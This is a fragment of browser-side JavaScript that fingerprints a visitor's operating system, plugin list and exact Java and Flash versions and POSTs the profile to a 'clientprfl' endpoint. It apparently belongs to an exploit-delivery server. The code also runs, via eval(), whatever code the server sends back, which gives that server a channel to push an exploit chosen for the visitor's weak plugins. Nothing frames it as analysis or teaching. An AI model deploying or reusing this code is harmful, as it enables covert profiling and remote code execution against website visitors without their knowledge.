                } catch(e) {
                    xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
                }
            }
            if(!xhr) {
                throw "failed to create XMLHttpRequest";
            }
            return xhr;
        }
        
xhr = make_xhr();
xhr.onreadystatechange = function() {
    if(xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
        eval(xhr.responseText);
    }
}

var data = {};

var PD = PluginDetect;

//Set delimiter
PD.getVersion(".");

//Get client Info
data = os_detect.getVersion()

//Check to see if the UA is a lying bastard
data['ua_is_lying'] = os_detect.ua_is_lying

//Try to get plugin list
var pluginList = [];
if (navigator.plugins) {
    for (var p = 0; p < navigator.plugins.length; p++) {
        var pName = navigator.plugins[p].name;
        pluginList.push(pName);
    }
}

if (pluginList.length > 0){
    data['plugin_list'] = pluginList;
}

//Check if java plugin is installed and/or enabled
//var javaEnabled = PD.isMinVersion('java');
//data['java'] = javaEnabled;

//Get exact java plugin version
var javaVersionString = PD.getVersion('java');
data['java'] = javaVersionString;

//Check if flash plugin is installed and/or enabled
//var flashEnabled = PD.isMinVersion('flash');
//data['flash'] = flashEnabled;

//Get exact flash plugin version
var flashVersionString = PD.getVersion('flash');
data['flash'] = flashVersionString;

xhr.open("POST", "clientprfl", true);
xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
xhr.send(JSON.stringify(data));
